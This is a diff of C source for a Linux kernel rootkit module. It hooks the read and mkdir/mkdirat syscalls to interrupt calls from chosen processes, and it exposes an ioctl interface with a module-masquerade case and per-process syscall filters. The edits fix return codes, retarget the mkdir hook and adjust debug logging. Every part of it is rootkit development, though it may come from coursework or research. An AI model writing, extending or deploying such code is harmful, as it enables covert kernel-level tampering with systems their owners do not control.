@@ -1,7 +1,6 @@
 #include "rootkit.h"
 
 #include <asm/syscall.h>
-#include <asm/unistd.h>
 #include <linux/cdev.h>
 #include <linux/dirent.h>
 #include <linux/errno.h>
@@ -42,12 +41,12 @@ MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
 
 static asmlinkage long my_sys_read(const struct pt_regs *regs) {
-  pr_warn("my_sys_read\n");
+  //pr_warn("my_sys_read\n");
   struct filter_info *pos;
   list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
       pr_info("Filtering read syscall for process %s\n", pos->comm);
-      return EINTR;
+      return -EINTR;
     }
   }
 
@@ -65,13 +64,13 @@ static asmlinkage long my_sys_read(const struct pt_regs *regs) {
 }
 
 static asmlinkage long my_sys_mkdir(const struct pt_regs *regs) {
-  pr_warn("my_sys_mkdir\n");
+  pr_warn("my_sys_mkdir %s\n", current->comm);
   struct filter_info *pos;
   list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 &&
         pos->syscall_nr == __NR_mkdir) {
       pr_info("Filtering mkdir syscall for process %s\n", pos->comm);
-      return EINTR;
+      return -EINTR;
     }
   }
 
@@ -128,8 +127,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     }
     break;
   case IOCTL_MOD_MASQ:
-    if (module_list == NULL)
-      module_list = THIS_MODULE->list.prev;
     struct masq_proc_req *req = (struct masq_proc_req *)kmalloc(
         sizeof(struct masq_proc_req), GFP_KERNEL);
     struct masq_proc_req *usr_req = (struct masq_proc_req *)arg;
@@ -185,12 +182,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
     struct filter_info *pos;
 
-    list_for_each_entry(pos, &filter_list.list, list) {
-      if (strcmp(pos->comm, filter->comm) == 0) {
-        // process already has a filter
-        return -EEXIST;
-      }
-    }
 
     if (total_references[filter->syscall_nr] > 0) {
       list_for_each_entry(pos, &filter_list.list, list) {
@@ -210,6 +201,9 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     }
 
     total_references[filter->syscall_nr] += 1;
+    pr_warn("read %d\n", total_references[__NR_read]);
+    pr_warn("mkdir %d\n", total_references[__NR_mkdirat]);
+
     list_add(&filter->list, &filter_list.list);
     break;
   }
@@ -284,7 +278,7 @@ static int __init rootkit_init(void) {
 
   // hook syscalls
   custom_handlers[__NR_read] = my_sys_read;
-  custom_handlers[__NR_mkdir] = my_sys_mkdir;
+  custom_handlers[__NR_mkdirat] = my_sys_mkdir;
 
   return 0;
 }
